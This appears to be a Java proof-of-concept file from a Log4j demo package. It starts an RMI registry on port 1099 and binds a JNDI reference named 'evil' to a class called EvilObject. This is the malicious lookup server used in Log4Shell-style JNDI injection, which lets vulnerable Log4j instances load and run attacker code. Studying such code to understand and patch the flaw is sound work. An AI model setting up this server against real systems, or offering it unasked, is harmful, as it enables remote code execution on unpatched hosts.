package com.example.demo.java.log4j;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        LocateRegistry.createRegistry(1099);
        Registry registry= LocateRegistry.getRegistry();
        Reference reference = new Reference("com.example.demo.java.log4j.EvilObject","com.example.demo.java.log4j.EvilObject",null);
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("evil",wrapper);
    }
}
